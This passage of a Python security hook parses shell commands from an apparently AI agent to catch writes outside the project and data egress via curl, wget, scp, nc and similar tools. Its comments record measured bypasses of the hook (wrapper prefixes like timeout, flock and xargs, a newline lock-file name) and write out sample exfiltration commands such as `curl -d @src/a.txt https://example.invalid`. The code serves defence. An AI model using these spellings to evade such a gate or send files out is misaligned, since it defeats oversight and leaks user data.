DOAS_VALUE_FLAGS = frozenset({"-u", "-a", "-C"})
DOAS_NOVALUE_FLAGS = frozenset({"-L", "-n", "-s"})
# ── The six prefixes closed in cycle P: xargs / timeout / nice / stdbuf / watch /
# setsid ───────────────────────────────────────────────────────────────────────
#
# All six were MEASURED silent through this extractor before these tables existed, on
# BOTH halves, because verb_at is the single source for the write pass and the egress
# pass: `timeout 5 cp seed.txt src/y.py`, `nice -n 5 cp ...`, `stdbuf -oL cp ...`,
# `watch -n1 cp ...`, `setsid cp ...` and `ls | xargs cp -t src` each emitted the EMPTY
# SET, as did `ls | xargs curl -d @f https://host`, `timeout 5 curl ...` and
# `setsid curl ...`, while the bare `cp seed.txt src/y.py` emitted `local <cwd>/src/y.py`.
#
# All six go in STRICT (both sets present), not PERMISSIVE. PERMISSIVE skips any dash
# token, which handles a glued value by accident but reads a SPACED value of an UNKNOWN
# flag as the verb. STRICT bails to ("", len(seg), []) on an unknown flag instead, so the
# trade is the same in every entry below: a mis-classified or unknown flag costs a MISS
# (no cmd0 arm, no egress row) and NEVER a prompt naming the wrong command. That is
# fail-closed for the verb and fail-open for detection, the precedent the sudo entry set.
# A bailed segment's plain redirects are still extracted, because the redirect loop never
# consults the verb.
#
# Each table was decided from the documented option grammar and then VERIFIED against the
# installed binary's own --help on this machine: coreutils 9.4 (timeout, nice, stdbuf),
# util-linux 2.39.3 (setsid), findutils 4.9.0 (xargs), procps-ng 4.0.4 (watch). Two
# divergences from the grammar the plan was written against were found and corrected here:
# procps-ng 4.0.4 has `-r/--no-rerun` (added below; it would otherwise have bailed) and no
# `--no-linewrap` (dropped), and xargs `-o/--open-tty` needed its short spelling. `watch
# -q` was the entry flagged as most likely to differ and it did not: 4.0.4 spells it
# `-q, --equexit <cycles>`, a REQUIRED value, so it is listed as VALUE.
SETSID_VALUE_FLAGS = frozenset()
SETSID_NOVALUE_FLAGS = frozenset({
    "-c", "--ctty", "-f", "--fork", "-w", "--wait", "-V", "--version", "-h", "--help",
})
STDBUF_VALUE_FLAGS = frozenset({"-i", "--input", "-o", "--output", "-e", "--error"})
STDBUF_NOVALUE_FLAGS = frozenset({"--help", "--version"})
# The obsolete `nice -5 cmd` spelling is a KNOWN MISS: `-5` is an unknown option letter,
# so it bails and detects nothing. Handling it would mean treating a numeric option letter
# as an adjustment, a second parsing shape for one deprecated spelling; the miss is
# accepted and named in the uncovered-prefix prose in the header.
NICE_VALUE_FLAGS = frozenset({"-n", "--adjustment"})
NICE_NOVALUE_FLAGS = frozenset({"--help", "--version"})
# `--differences[=permanent]` is NOVALUE on purpose: an optional long-option value must be
# glued with `=`, and the long branch checks novalue_flags FIRST, so `--differences=permanent`
# consumes exactly one token.
WATCH_VALUE_FLAGS = frozenset({"-n", "--interval", "-q", "--equexit"})
WATCH_NOVALUE_FLAGS = frozenset({
    "-b", "--beep", "-c", "--color", "-C", "--no-color", "-d", "--differences",
    "-e", "--errexit", "-g", "--chgexit", "-p", "--precise", "-r", "--no-rerun",
    "-t", "--no-title", "-w", "--no-wrap", "-x", "--exec", "-h", "--help",
    "-v", "--version",
})
# GNU xargs' OPTIONAL-argument spellings (`-e`, `-i`, `-l`, `--eof`, `--replace`,
# `--max-lines`) are listed NOVALUE, which makes the common spelling resolve
# (`xargs -i cp {} src/y.py` -> cp) while the GLUED spelling hits an unknown letter after
# the flag and bails (`xargs -iX cp ...` -> no detection). That miss is named in the
# header prose. MEASURED here rather than read off --help, which prints
# `--max-lines=MAX-LINES` as though the value were required: `printf 'a\n' | xargs
# --max-lines 3 echo hi` fails with "xargs: 3: No such file or directory", so the spaced
# value really is the command and NOVALUE is the correct classification.
XARGS_VALUE_FLAGS = frozenset({
    "-a", "--arg-file", "-d", "--delimiter", "-E", "-I", "-L",
    "-n", "--max-args", "-P", "--max-procs", "-s", "--max-chars",
    "--process-slot-var",
})
XARGS_NOVALUE_FLAGS = frozenset({
    "-0", "--null", "-r", "--no-run-if-empty", "-p", "--interactive",
    "-t", "--verbose", "-x", "--exit", "-o", "--open-tty", "--show-limits",
    "--help", "--version",
    "-e", "--eof", "-i", "--replace", "-l", "--max-lines",
})
TIMEOUT_VALUE_FLAGS = frozenset({"-s", "--signal", "-k", "--kill-after"})
TIMEOUT_NOVALUE_FLAGS = frozenset({
    "--preserve-status", "--foreground", "-v", "--verbose", "--help", "--version",
})
# ── The three prefixes closed in cycle S: flock / ionice / chrt ───────────────
#
# MEASURED silent through THIS extractor before these tables existed, on BOTH halves,
# for the one reason cycle P found: verb_at is the single source for the write pass and
# the egress pass, so a prefix it does not know hides both.
#   flock /tmp/l.lock cp seed.txt src/y.py                        -> set()
#   ionice -c3 cp seed.txt src/y.py                               -> set()
#   chrt -b 0 cp seed.txt src/y.py                                -> set()
#   flock /tmp/l.lock curl -d @src/a.txt https://example.invalid  -> set()
#   ionice -c3 curl -d @src/a.txt https://example.invalid         -> set()
#   chrt -b 0 curl -d @src/a.txt https://example.invalid          -> set()
# while the bare `cp seed.txt src/y.py` emitted `local /proj/src/y.py` and the bare
# `curl -d @src/a.txt https://example.invalid` emitted its egress row. Measured at the
# OUTER hook layer as well, with a crafted PreToolUse envelope from a cwd outside the
# project: `cp README.md ~/outside_probe.txt` and `nice cp README.md ~/outside_probe.txt`
# both DENIED with [ENF-PROJECT-BOUNDARY], while all three prefixed spellings of the same
# write were ALLOWED SILENTLY, with no decision at all.
#
# STRICT (both sets present), never PERMISSIVE, for cycle P's reason, and it matters MORE
# here because two of the three also step a positional: an unknown or mis-classified flag
# costs a MISS, never a prompt naming the wrong command.
#
# Each table is read off the INSTALLED binary's own --help on this machine, util-linux
# 2.39.3 for all three, NOT off the bash-completion files the plan drafted from. That
# corrected ONE classification: the completion file reads ionice's -p/-P/-u as bare
# switches, while `ionice --help` spells them `-p, --pid <pid>...`, so they are VALUE
# flags here. chrt's -a/--all-tasks, -m/--max, -v/--verbose and -p/--pid are all named by
# 2.39.3's own --help and are listed; its -p really is value-less (the pid follows as a
# positional, `chrt [options] -p <pid>`). flock 2.39.3 prints no --nb / --wait aliases, so
# neither is listed. A LETTER MEANS DIFFERENT THINGS IN DIFFERENT TABLES, so these three
# must never be copy-pasted between one another: flock's -n is --nonblock (no value) while
# ionice's -n is --classdata (value), and chrt's -P is --sched-period (value) while
# ionice's -P is --pgid (also value, but of a different tool's grammar).
FLOCK_VALUE_FLAGS = frozenset({
    "-w", "--timeout", "-E", "--conflict-exit-code", "-c", "--command",
})
FLOCK_NOVALUE_FLAGS = frozenset({
    "-s", "--shared", "-x", "--exclusive", "-u", "--unlock", "-n", "--nonblock",
    "-o", "--close", "-F", "--no-fork", "--verbose", "-h", "--help",
    "-V", "--version",
})
# ionice's -p/-P/-u id forms run NO command at all (`ionice -p 1234` only reports or sets
# a class), so no classification of them can lose a write; they are VALUE because that is
# what --help prints.
IONICE_VALUE_FLAGS = frozenset({
    "-c", "--class", "-n", "--classdata", "-p", "--pid", "-P", "--pgid", "-u", "--uid",
})
IONICE_NOVALUE_FLAGS = frozenset({
    "-t", "--ignore", "-h", "--help", "-V", "--version",
})
CHRT_VALUE_FLAGS = frozenset({
    "-T", "--sched-runtime", "-P", "--sched-period", "-D", "--sched-deadline",
})
CHRT_NOVALUE_FLAGS = frozenset({
    "-b", "--batch", "-d", "--deadline", "-f", "--fifo", "-i", "--idle",
    "-o", "--other", "-r", "--rr", "-R", "--reset-on-fork",
    "-a", "--all-tasks", "-m", "--max", "-p", "--pid", "-v", "--verbose",
    "-h", "--help", "-V", "--version",
})
# Wrapper -> (flags whose value is the NEXT token, flags known to take no value).
#
# A None second element means PERMISSIVE: any dash token is skipped. Safe for these
# five -- their option sets are tiny and stable and they take no positional arguments
# of their own, so the token after the options IS the verb.
#
# A set means STRICT: sudo's real short-option grammar is mirrored for the KNOWN letters
# (bundling, and a value glued to its letter as in `-udeploy`), and only an UNKNOWN option
# BAILS to no-detection. The bail exists because guessing a value's position would swallow
# the real verb and could raise a prompt naming the WRONG command, which is worse than a
# miss; it is never worse than the pre-fix behavior, where `sudo <anything>` went
# undetected outright.
WRAPPERS = {
    "command": (frozenset(), None),
    "env": (frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}), None),
    "exec": (frozenset({"-a"}), None),
    "nohup": (frozenset(), None),
    "time": (frozenset({"-o", "--output", "-f", "--format"}), None),
    "sudo": (SUDO_VALUE_FLAGS, SUDO_NOVALUE_FLAGS),
    "doas": (DOAS_VALUE_FLAGS, DOAS_NOVALUE_FLAGS),
    "timeout": (TIMEOUT_VALUE_FLAGS, TIMEOUT_NOVALUE_FLAGS),
    "nice": (NICE_VALUE_FLAGS, NICE_NOVALUE_FLAGS),
    "stdbuf": (STDBUF_VALUE_FLAGS, STDBUF_NOVALUE_FLAGS),
    "watch": (WATCH_VALUE_FLAGS, WATCH_NOVALUE_FLAGS),
    "setsid": (SETSID_VALUE_FLAGS, SETSID_NOVALUE_FLAGS),
    "xargs": (XARGS_VALUE_FLAGS, XARGS_NOVALUE_FLAGS),
    "flock": (FLOCK_VALUE_FLAGS, FLOCK_NOVALUE_FLAGS),
    "ionice": (IONICE_VALUE_FLAGS, IONICE_NOVALUE_FLAGS),
    "chrt": (CHRT_VALUE_FLAGS, CHRT_NOVALUE_FLAGS),
}
# How many NON-FLAG positional arguments of its own a wrapper takes before the command.
# THREE members of sixteen, because three wrappers have a genuine positional:
# `timeout DURATION COMMAND`, `flock FILE COMMAND` and `chrt PRIORITY COMMAND`. Still a
# side table rather than a third element in the WRAPPERS tuple, so the thirteen other
# entries stay byte-identical and no existing prefix changes behavior by one token
# (.get(name, 0) is 0 for all of them).
#
# WHAT QUALIFIES a wrapper for this table is that its positional is MANDATORY, not that it
# has a checkable shape. All three require theirs in every command-running form, so
# stepping one reads the tool's own grammar rather than guessing against it. `coproc` and
# `function` are excluded for the opposite reason and stay out: their NAME is OPTIONAL, so
# stepping it IS a guess (see GROUP_VERB_TOKENS).
WRAPPER_POSITIONALS = {"timeout": 1, "flock": 1, "chrt": 1}
# The SHAPE of that positional, PER WRAPPER, because the three are not the same kind of
# token and one regex for all three re-blinds whichever it does not fit.
#
# timeout and chrt are SHAPE-CHECKED: coreutils spells a duration as a float with an
# optional s/m/h/d suffix, and a chrt priority is a non-negative integer. A token that
# does not look like one is NOT skipped and becomes the verb, which is the fail-closed
# direction for DETECTION. The only command that lands there is one the tool itself
# rejects (`timeout` requires a duration; `chrt -b cp a b` is "invalid priority
# argument"), so the cost is at worst an extra row for a command that never runs, never a
# lost row for one that does.
#
# flock's lock target is stepped UNCONDITIONALLY, and a shape check there would BE the
# defect rather than the guard: a lock file can be named anything, so a shape that rejects
# `/tmp/l.lock` would leave the path unskipped and resolve `l.lock` as the verb, which is
# exactly the blindness this cycle closes. One skip is right in both spellings, because
# with a command present flock reads the first positional as a FILE even when it looks
# numeric (`flock -x 200 cp a b` really does run cp). The `i < len(seg)` guard is what
# makes the fd-only form (`flock -x 200`) and the bare `flock` land past the end with no
# verb instead of raising; both run no command, so nothing is lost.
#
# The lookup in verb_at is a bare SUBSCRIPT, not .get with a default: a positional entry
# with no shape entry is a table drift, and a loud failure (pinned by the key-set parity
# check in tests/test_bash_wrapper_prefix_gate.py) beats a silently-chosen default.
DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")     # timeout: coreutils duration
PRIORITY = re.compile(r"^[0-9]+$")                         # chrt: non-negative integer
# flock: any non-empty token. `[\s\S]`, NOT `.`, and this is not style: python's `.` does
# not match a newline without re.DOTALL, so `flock $'\n' cp x outside` left the lock target
# unskipped, resolved the newline as the verb, and went silent on the write, credential and
# egress passes at once. Real flock accepts a lock file named with a newline and runs the
# wrapped command, so that spelling was a live bypass, measured against this hook. An empty
# token still does not match, which is correct: flock exits 66 on an empty lock name, so
# nothing runs.
LOCK_TARGET = re.compile(r"[\s\S]")
WRAPPER_POSITIONAL_SHAPES = {"timeout": DURATION, "flock": LOCK_TARGET, "chrt": PRIORITY}
# Assignments that silently move the real destination. `no_proxy` is excluded: it
# DISABLES proxying, it does not redirect. Compared lowercased, so HTTPS_PROXY counts.
PROXY_ASSIGN_NAMES = {"http_proxy", "https_proxy", "all_proxy"}


def verb_at(seg):
    """(effective verb, index of its first argument, leading NAME=value assignments).

    ("", len(seg), ...) when the segment has no verb at all (assignments only) or when a
    STRICT wrapper's options could not be classified. SINGLE SOURCE: both the write
    extractor's cmd0 and the egress pass resolve through this, so the two vectors cannot
    drift on what "the command" is.

    GROUP CONSTRUCTS are stepped over before anything else: a group opener (bare or glued,
    `(cp`) and a reserved word a command list follows (`then`, `if`, `!`, ...) sit in verb
    position without being the verb, and reading one AS the verb is what made
    `(cp seed.txt <secret>)` a silent allow. `[`, `[[` and `test` are NOT stepped, because
    they ARE the verb and seg_is_test suppression depends on that.
    """
    assigns = []
    i = 0
    while i < len(seg):
        raw = strip_group_opener(seg[i])
        if raw in GROUP_VERB_TOKENS:
            i += 1                    # a group opener or reserved word, not the verb
            continue
        tok = dequote(raw)
        if ASSIGNMENT.match(tok):
            assigns.append(tok)
            i += 1
            continue
        name = os.path.basename(tok[1:] if tok.startswith("\\") else tok)
        spec = WRAPPERS.get(name)
        if spec is None:
            return name, i + 1, assigns
        value_flags, novalue_flags = spec
        i += 1
        while i < len(seg):       # the wrapper's own assignments and flags
            nxt = dequote(seg[i])
            if ASSIGNMENT.match(nxt):
                assigns.append(nxt)
                i += 1
                continue
            if nxt == "--":       # end of the wrapper's options
                i += 1
                break
            if not nxt.startswith("-") or nxt == "-":
                break
            if novalue_flags is None:
                i += 1
                if nxt in value_flags:
                    i += 1
                continue
            if nxt.startswith("--"):
                base = nxt.split("=", 1)[0]
                if base in novalue_flags:
                    i += 1
                    continue
                if base in value_flags:
                    i += 1
                    if "=" not in nxt:        # `--user=x` carries its value, `--user x` does not
                        i += 1
                    continue
                return "", len(seg), []       # unknown long option: bail, detect nothing
            # Short options, parsed the way sudo really parses them: letters bundle, and
            # the FIRST value-taking letter takes the REST of the token as its value
            # (`-udeploy`), or the next token when nothing is left (`-u deploy`,
            # `-nHu deploy`). Only an UNKNOWN letter is unclassifiable, and only that
            # bails -- guessing a value's position is what would swallow the real verb.
            takes_next, unknown = False, False
            for k in range(1, len(nxt)):
                letter = "-" + nxt[k]
                if letter in novalue_flags:
                    continue
                if letter in value_flags:
                    takes_next = k + 1 >= len(nxt)
                    break
                unknown = True
                break
            if unknown:
                return "", len(seg), []       # unknown option letter: bail, detect nothing
            i += 2 if takes_next else 1
        # The wrapper's OWN positional arguments, after its flags. Placement here is what
        # makes every spelling work: the flag loop exits by `break` on the first non-dash
        # token (`timeout 5 cp`), or on `--` (`timeout -- 5 cp`), or after consuming a
        # value (`timeout -s KILL 5 cp`, `timeout -k 1 5 cp`), and the step runs in all
        # four cases. A bail inside the flag loop RETURNS outright, so the step is never
        # reached with an unclassified option.
        for _ in range(WRAPPER_POSITIONALS.get(name, 0)):
            if i < len(seg) and WRAPPER_POSITIONAL_SHAPES[name].match(dequote(seg[i])):
                i += 1
    return "", len(seg), assigns


# ── Nested commands: find's exec family ─────────────────────────────────────
# A DIFFERENT MECHANISM from the WRAPPERS prefixes above, and the reason the find
# spellings were pinned SILENT rather than closed with a flag table: the nested command
# does not sit IN FRONT of the command, it sits INSIDE an argument list, ended by one of
# find's own terminator tokens. verb_at returns ONE verb per segment and returns at the
# first non-WRAPPERS name, so cmd0 for the whole segment was `find`, which matches none
# of the four write arms below and none of EGRESS_VERBS.
#
# FOUR FLAGS, which is TWO MORE than this file used to name. `-ok` and `-okdir` prompt
# before each command and then RUN it, and both were measured silent; naming only
# `-exec` and `-execdir` undercounted the family, which is worse than a wide hole
# honestly stated.
#
# Matched on the RAW token and never dequoted: a quoted `'-exec'` is a mention in
# someone else's argument list and must not open a span, the same rule
# strip_group_opener applies to a quoted group opener. NOT conditioned on the verb being
# `find`: the FLAGS are the mechanism, and this file's own posture (see
# WRAPPER_POSITIONALS) is fail-closed for the verb and fail-open for detection, where an
# extra row for a command that never runs is cheaper than a lost row for one that does.
NESTED_CMD_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
# The terminator characters, AFTER one layer of shell quoting and one leading backslash
# come off. MEASURED token forms through this extractor: an escaped semicolon arrives as
# '\\;', a single-quoted one as "';'", a double-quoted one as '";"', and the batch form
# as '+'. The first three survive as distinct tokens because _split_one_token keeps an
# escaped character and a quoted span together, and none of them is a CONTROL member, so
# a span end is reliably findable. A BARE semicolon never appears inside a segment at
# all: it IS a CONTROL token, so it already ended the segment before this runs.
NESTED_TERMINATOR_CHARS = frozenset({";", "+"})


def is_nested_terminator(tok):
    """True for find's own end-of-command token in any of its four spellings."""
    t = dequote(tok)
    if t.startswith("\\"):
        t = t[1:]
    return t in NESTED_TERMINATOR_CHARS


def nested_command_spans(seg):
    """Every nested command carried INSIDE this segment's argument list, as its own
    token list.

    Spliced into `segments` as ADDITIONAL entries by the caller rather than handled by a
    fifth cmd0 arm, because the write pass, the interpreter pass and the egress pass are
    three loops over the SAME list: one splice resolves `cp` for the write arms and
    `curl` for the egress arms with no change to either set of arms and none to verb_at.
    A fifth arm would duplicate all four arms' destination logic and would not reach
    egress at all.

    A span runs from the token after the flag to the terminator, or to the END of the
    segment when there is none: a nested command with no terminator is a real spelling
    users type (find itself rejects it, but this gate's job is to see the write, not to
    validate find's grammar). A segment boundary is a hard stop for free, because
    CONTROL tokens split segments before this ever runs.
    """
    spans = []
    i = 0
    while i < len(seg):
        if seg[i] not in NESTED_CMD_FLAGS:
            i += 1
            continue
        i += 1
        start = i
        while i < len(seg) and not is_nested_terminator(seg[i]):
            i += 1
        if i > start:
            spans.append(seg[start:i])
    return spans


# Flags whose value is the NEXT token, so a value can never be mistaken for the URL or
# the copy destination. Per verb on purpose: -T is curl's upload-file but wget's timeout.
CURL_VALUE_FLAGS = {
    "-d", "--data", "--data-raw", "--data-binary", "--data-ascii", "--data-urlencode",
    "--json", "-F", "--form", "--form-string", "-T", "--upload-file",
    "-H", "--header", "-o", "--output", "-X", "--request", "-u", "--user",
    "-A", "--user-agent", "-e", "--referer", "--url", "-b", "--cookie",
    "-c", "--cookie-jar", "-m", "--max-time", "--connect-timeout", "-w", "--write-out",
    "-E", "--cert", "--key", "--cacert", "--capath", "-x", "--proxy", "--resolve",
    "-K", "--config", "--retry", "--limit-rate", "--oauth2-bearer", "--aws-sigv4",
    "--interface", "-y", "-Y", "-z", "--time-cond", "--connect-to", "--preproxy",
    "--socks4", "--socks4a", "--socks5", "--socks5-hostname", "--proxy1.0",
    "--proxy-user", "-U",
}
WGET_VALUE_FLAGS = {
    "--post-data", "--post-file", "--body-data", "--body-file", "--method",
    "-O", "--output-document", "-o", "--output-file", "--header", "--user",
    "--password", "-U", "--user-agent", "-P", "--directory-prefix", "-T", "--timeout",
    "-t", "--tries", "-w", "--wait", "-i", "--input-file", "--referer",
    "--limit-rate", "--load-cookies", "--save-cookies", "--certificate",
    "--ca-certificate", "--bind-address", "--http-user", "--http-password",
}
CURL_PAYLOAD_FLAGS = {"-d", "--data", "--data-raw", "--data-binary", "--data-ascii",
                      "--data-urlencode", "--json", "-F", "--form", "--form-string",
                      "-T", "--upload-file"}
WGET_PAYLOAD_FLAGS = {"--post-data", "--post-file", "--body-data", "--body-file"}
# These name a FILE directly; the others carry an inline body that may reference a file
# with a leading @ (curl's own syntax).
FILE_VALUE_FLAGS = {"-T", "--upload-file", "--post-file", "--body-file"}
METHOD_FLAGS = {"-X", "--request", "--method"}
SEND_METHODS = {"POST", "PUT", "PATCH"}
# Flags that move the REAL TCP destination away from the URL's apparent host, so the
# apparent host stops being evidence about where the payload goes. An egress-shaped
# command carrying one of these asks REGARDLESS of the allowlist.
DEST_OVERRIDE_FLAGS = {"--resolve", "--connect-to", "-x", "--proxy", "--preproxy",
                       "--socks4", "--socks4a", "--socks5", "--socks5-hostname",
                       "--proxy1.0"}
REMOTE_VALUE_FLAGS = {
    "-P", "-i", "-o", "-c", "-F", "-J", "-S", "-l", "-b", "-D", "-s",   # scp / sftp
    "-e", "--rsh", "--exclude", "--include", "--exclude-from", "--include-from",
    "--files-from", "--filter", "-f", "--bwlimit", "--timeout", "--port", "--log-file",
    "--temp-dir", "-T", "--chmod", "--out-format", "--compare-dest", "--link-dest",
    "--copy-dest", "--partial-dir", "--block-size", "-B",               # rsync
}
NC_VALUE_FLAGS = {"-p", "-s", "-w", "-q", "-X", "-x", "-i", "-O", "-e", "-c", "-m"}
TELNET_VALUE_FLAGS = {"-b", "-e", "-l", "-n", "-S", "-x"}
GH_VALUE_FLAGS = {"-d", "--desc", "-f", "--filename", "-R", "--repo"}
EGRESS_VERBS = ("curl", "wget", "scp", "rsync", "sftp", "gh",
                "nc", "ncat", "netcat", "telnet")
GIST_HOST = "gist.github.com"


def strip_redirs(args):
    """(args with redirections removed, fed_by_input_redirect). The egress rules ask
    whether local data FEEDS the command, and a redirect target is not an argument."""
    out, fed, skip = [], False, False
    for tok in args:
        if skip:
            skip = False
            continue
        if tok[:1] in ("'", '"'):
            out.append(tok)
            continue
        if tok.startswith("<") and not tok.startswith("<("):
            fed = True
            if tok in ("<", "<<", "<<<"):
                skip = True          # spaced: the next token is the source
            continue
        m = REDIR.match(tok)
        if m:
            rest = tok[m.end():]
            if not rest:
                skip = True          # spaced: the next token is the target
            continue
        out.append(tok)
    return out, fed


def flag_walk(args, value_flags):
    """(positionals, [(flag, value), ...]) for one segment's arguments.

    `--flag=value` splits on the first `=`; a glued short flag (`-XPOST`, `-d@f`)
    splits after two characters; otherwise a value-taking flag consumes the next token.
    """
    pos, flags, i = [], [], 0
    while i < len(args):
        a = dequote(args[i])
        if a.startswith("-") and a != "-":
            flag, val = a, None
            if a.startswith("--") and "=" in a:
                flag, val = a.split("=", 1)
            elif not a.startswith("--") and len(a) > 2 and a[:2] in value_flags:
                flag, val = a[:2], a[2:]
            elif a in value_flags and i + 1 < len(args):
                val = args[i + 1]
                i += 1
            flags.append((flag, dequote(val) if val is not None else ""))
        else:
            pos.append(a)
        i += 1
    return pos, flags


def payload_detail(flag, val):
    """A short human phrase for one payload flag: the file it reads, stdin, or an inline
    body. A credential-shaped path is CALLED OUT and still only asks -- the brief fixes
    the egress policy at confirmation, not refusal."""
    name = ""
    if flag in FILE_VALUE_FLAGS:
        name = val
    elif "@" in val:
        name = val.split("@", 1)[1]
    if name == "-":
        return flag + " payload read from stdin"
    if name:
        if is_cred(name):
            return flag + " payload from file " + name + " (credential-shaped path)"
        return flag + " payload from file " + name
    return flag + " inline payload"


def egress_http(verb, args, fed, proxy_assign=""):
    """curl / wget: egress when a payload flag is present, or when the method is
    POST/PUT/PATCH AND the segment is fed by a pipe or an input redirect.

    Hits are (host, detail, force). `force` skips the allowlist: --resolve / --connect-to
    / -x / --proxy and a leading http_proxy=/https_proxy=/all_proxy= assignment all make
    the real TCP destination DIVERGE from the URL's apparent host, so a payload POST to an
    apparently-allowlisted host could otherwise ship the body anywhere. The apparent host
    cannot be trusted once the command overrides it, and the safe answer to "cannot be
    trusted" is the prompt, not silence. An override on a command that is NOT egress-shaped
    changes nothing: the no-payload return below fires first.
    """
    vflags = CURL_VALUE_FLAGS if verb == "curl" else WGET_VALUE_FLAGS
    pflags = CURL_PAYLOAD_FLAGS if verb == "curl" else WGET_PAYLOAD_FLAGS
    pos, flags = flag_walk(args, vflags)
    url, method, details, override = "", "", [], ""
    for flag, val in flags:
        if flag == "--url" and val:
            url = val
        if flag in METHOD_FLAGS:
            method = val.upper()
        if flag in pflags:
            details.append(payload_detail(flag, val))
        if flag in DEST_OVERRIDE_FLAGS and not override:
            override = flag + (" " + val if val else "")
    if not url:
        for p in pos:
            if p:
                url = p
                break
    if not details:
        if method not in SEND_METHODS or not fed:
            return []
        details.append(method + " body fed from stdin (pipe or input redirect)")
    if not override and proxy_assign:
        # NAME plus the resolved proxy HOST only. host_of drops userinfo, so a
        # `http_proxy=http://user:pass@host` value cannot carry credentials into a reason
        # string that log_gate_decision retains in the audit stream (SEC-DATA-MASK-001).
        pname, _eq, pval = proxy_assign.partition("=")
        phost = host_of(pval)
        override = ("the " + pname + " assignment"
                    + (" (proxy host " + phost + ")" if phost else ""))
    host = host_of(url)
    if override:
        # The apparent host is LABELLED, never presented bare: a reader must not skim
        # "localhost" off a line whose payload is actually going somewhere else.
        note = " -- real destination overridden by " + override
        return [((host + " (apparent only)" if host else ""), d + note, True)
                for d in details]
    return [(host, d, False) for d in details]


def egress_copy(verb, args):
    """scp / rsync: egress only when the DESTINATION (the last positional) is remote, so
    a download and a local-to-local copy never prompt."""
    pos, _flags = flag_walk(args, REMOTE_VALUE_FLAGS)
    if len(pos) < 2:
        return []
    dest = pos[-1]
    host = remote_host(dest)
    if not host:
        return []
    return [(host, verb + " destination " + dest, False)]


def egress_sftp(args):
    """sftp: deliberately coarser than scp. Whether an interactive session `put`s
    anything is unknowable at PreToolUse time, and the answer to unknowable is a
    prompt, not a denial."""
    pos, _flags = flag_walk(args, REMOTE_VALUE_FLAGS)
    if not pos:
        return []
    target = pos[-1]
    host = remote_host(target) or bare_host(target)
    if not host:
        return []
    return [(host, "sftp session with " + target, False)]


def egress_gh(args):
    """gh: `gist create` only. Every other subcommand is out of scope."""
    pos, _flags = flag_walk(args, GH_VALUE_FLAGS)
    if len(pos) < 2 or pos[0] != "gist" or pos[1] != "create":
        return []
    files = [p for p in pos[2:] if p and p != "-"]
    what = " ".join(files) if files else "stdin"
    return [(GIST_HOST, "gh gist create " + what, False)]


def egress_socket(verb, args, fed):
    """nc / ncat / netcat / telnet: egress only when local data feeds the command. A
    listener receives rather than sends, so -l is never egress."""
    if not fed:
        return []
    vflags = TELNET_VALUE_FLAGS if verb == "telnet" else NC_VALUE_FLAGS
    pos, flags = flag_walk(args, vflags)
    if verb != "telnet" and any(
            f == "--listen" or (f.startswith("-") and not f.startswith("--") and "l" in f)
            for f, _v in flags):
        return []
    if not pos:
        return []
    return [(host_of(pos[0]), verb + " to a raw socket, fed from stdin", False)]


# ── The value side: what a real shell resolves a WRITE TARGET to ────────────
# expand_word is dequote's replacement in VALUE positions only, which is why the two sit
# together. dequote stays exactly where it is for verb/flag/host resolution above: those
# consumers ask what a token SAYS, and this one asks what it will BECOME.
#
# The full argument for the placement, the four spellings that must NOT be expanded and
# the unresolved-variable ask is in the header, under "Same seam, seventh instance". The
# short version, because it is the one thing a reader must not have to reconstruct: by the
# classification loop below, `"$HOME/x"` and `'$HOME/x'` are the SAME BYTES and their
# correct answers are opposite, so expansion can only be correct while the raw token, with
# its quote characters still attached, is in hand.
#
# Returns a 2-TUPLE (value, unresolved): the string bash would produce for this word under
# the expansions below, and the NAME of the first simple-name parameter that could not be
# resolved from this hook's own environment ("" when everything resolved). The name rather
# than a bare bool, because the confirmation this drives has to say WHICH variable the gate
# could not see; an ask that cannot name what is unknown is not much better than silence.
# Simple names only, resolved from the environment: the mechanism is parameter expansion,
# and keying this on the literal name HOME is the shape that leaves $TMPDIR/x open.
# EXPAND BEGIN expand_word
LOGIN_NAME = re.compile(r"[A-Za-z_][A-Za-z0-9_.-]*")
PARAM_NAME = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")
ASSIGN_PREFIX = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=")


def expand_word(raw):
    # strip_unbalanced_close runs FIRST, and the existing call at the head of the
    # classification loop STAYS. That is not a second competing normalization point (the
    # control-operator ADR rejects those): the function is idempotent, and the later call
    # still normalizes interpreter hits and the `dd of=` substring, which never pass
    # through here. This call exists for one measured reason: `(cp README.md ~)` reaches
    # this function as the token `~)`, whose tilde-prefix would be `)`, not a login name,
    # so the word would stay literal while the shell still copies into $HOME.
    tok = strip_unbalanced_close(raw)

    # Tilde-expandable OFFSETS, decided by the word's SHAPE before the scan starts, because
    # that is what the rule is about: a tilde expands at the start of a word and (only
    # when the text before the first `=` is a valid shell NAME) immediately after that
    # `=` and after every following `:`. Measured, not read off a manual: `of=~/x`,
    # `foo_1=~/x` and `a=b:~/x` expand; `fo-o=~/x`, `2bad=~/x` and `--opt=~/x` do not.
    # `dd of=` is a collected write form, so the expanding half is a live bypass, and
    # `cp --target-directory=~/x` is correct today precisely because the other half is not.
    tilde_at = {0}
    assign = ASSIGN_PREFIX.match(tok)
    if assign:
        tilde_at.add(assign.end())
        tilde_at.update(j + 1 for j in range(assign.end(), len(tok)) if tok[j] == ":")

    out = []
    unresolved = ""
    quote = ""
    i = 0
    while i < len(tok):
        ch = tok[i]

        # Single quotes: no expansion and no escape of any kind exists in here. THIS is
        # the arm that keeps '~/x' and '$HOME/x' the in-project literals a real shell
        # makes them, and it is the whole reason expansion cannot run after dequote.
        if quote == "'":
            if ch == "'":
                quote = ""
            else:
                out.append(ch)
            i += 1
            continue

        # A quote character is DROPPED wherever it appears, which is strictly better than
        # dequote's matched-outer-pair rule: dequote left `$HOME"/x"` with its quote
        # characters attached and the classified path carried them into the audit row.
        if quote == "" and ch in ("'", '"'):
            quote = ch
            i += 1
            continue
        if quote == '"' and ch == '"':
            quote = ""
            i += 1
            continue

        # Backslash. Outside quotes it escapes ANY next character, which is what keeps
        # `\~/x` and `\$HOME/x` literal. Inside double quotes it escapes only these four;
        # in front of anything else there it is an ordinary backslash.
        if ch == "\\":
            nxt = tok[i + 1] if i + 1 < len(tok) else ""
            if nxt and (quote == "" or (quote == '"' and nxt in ('$', '`', '"', '\\'))):
                out.append(nxt)
                i += 2
                continue
            out.append(ch)
            i += 1
            continue

        # Parameter expansion, $NAME and ${NAME}, outside quotes and inside DOUBLE quotes.
        # The brace form must accept ONLY a bare name: `${VAR:-/etc}` and its relatives are
